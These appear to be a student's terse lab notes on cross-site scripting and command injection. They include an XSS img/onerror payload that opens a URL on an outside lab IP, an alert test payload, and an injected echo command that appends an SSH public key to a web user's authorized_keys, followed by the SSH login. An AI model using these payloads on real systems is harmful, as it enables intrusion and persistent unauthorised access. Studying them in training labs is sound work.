reflected xss
  send code to server, server doesn't like and sends it back, browser runs code bc server sent it
  takes advantage of vulnerable browser
stored xss 
  takes advantage of vulnerable server
  persistent
    stored in the server so anytime anybody goes to the site, it executes
  <img src="http://invalid" onerror="window.open('http://10.50.XX.XX:8000/ram.png','xss','height=1,width=1');">

<script>alert('XSS');</script>

if a vulnerable field is found, you can upload your public ssh key onto it so you don't have to authenticate when trying to get onto the box
  the entire bigass thing is your key
  go to/make /var/www/.ssh/
  vim test.txt
    ; echo "**INSERT ENTIRE PUBLIC KEY**" >> /var/www/.ssh/authorized_keys
  copy paste the echo command into the vulnerable field
  ssh www-data@10.50.45.252 -i id_rsa
    -i lets you choose what key you're authenticating with
